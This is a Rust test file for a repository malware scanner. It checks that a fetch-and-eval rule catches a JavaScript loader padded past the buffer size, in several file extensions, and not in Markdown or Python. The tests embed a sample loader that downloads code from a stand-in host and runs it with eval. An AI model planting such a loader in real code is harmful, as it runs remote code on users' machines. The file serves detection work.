//! The loader rules need a whole file, so a text file past the buffered size is
//! read into memory for them: padding a loader with comments to 5 MiB must not
//! hide it, and must not make the scan inconclusive. Cases generated here; the
//! fixture folder holds the rest.

use std::fs;

use repo_sniff_core::{Limits, Report, Severity, builtin_rules, scan};

const LOADER: &str = "const axios = require('axios');\n\
                      axios.get('https://payload.example.invalid/x').then((r) => eval(r.data));\n";

fn scan_files(files: &[(&str, Vec<u8>)], limits: Limits) -> Report {
    let dir = tempfile::tempdir().unwrap();
    for (name, contents) in files {
        let path = dir.path().join(name);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, contents).unwrap();
    }
    scan(dir.path(), &builtin_rules().unwrap(), limits)
}

fn rows(report: &Report, rule: &str) -> Vec<(String, usize, Severity)> {
    report
        .findings
        .iter()
        .filter(|f| f.rule_id == rule)
        .map(|f| (f.file.to_string_lossy().into_owned(), f.line, f.severity))
        .collect()
}

#[test]
fn a_loader_padded_past_the_buffered_size_is_still_found_and_the_scan_is_complete() {
    let padding = "// padding\n".repeat(1000);
    let text = format!("{padding}{LOADER}");
    let limits = Limits {
        max_buffered_size: 1024,
        ..Limits::default()
    };

    let report = scan_files(&[("big.js", text.into_bytes())], limits);

    assert_eq!(
        rows(&report, "run.js-fetch-eval"),
        [("big.js".to_string(), 1002, Severity::Critical)]
    );
    assert!(report.is_complete(), "{:?}", report.skipped);
}

#[test]
fn a_streamed_file_and_one_read_whole_agree() {
    let whole = scan_files(&[("a.js", LOADER.as_bytes().to_vec())], Limits::default());
    let streamed = scan_files(
        &[("a.js", LOADER.as_bytes().to_vec())],
        Limits {
            max_buffered_size: 8,
            ..Limits::default()
        },
    );

    assert_eq!(
        rows(&whole, "run.js-fetch-eval"),
        rows(&streamed, "run.js-fetch-eval")
    );
    assert_eq!(rows(&whole, "run.js-fetch-eval").len(), 1);
}

#[test]
fn a_loader_in_a_typescript_or_module_file_is_found_too() {
    let files: Vec<(&str, Vec<u8>)> = ["a.ts", "b.mjs", "c.cjs", "d.tsx", "e.jsx", "f.mts"]
        .iter()
        .map(|name| (*name, LOADER.as_bytes().to_vec()))
        .collect();

    let report = scan_files(&files, Limits::default());

    assert_eq!(rows(&report, "run.js-fetch-eval").len(), 6);
}

#[test]
fn other_files_are_not_read_as_javascript() {
    let report = scan_files(
        &[
            ("notes.md", LOADER.as_bytes().to_vec()),
            ("a.py", LOADER.as_bytes().to_vec()),
        ],
        Limits::default(),
    );

    assert!(rows(&report, "run.js-fetch-eval").is_empty());
}
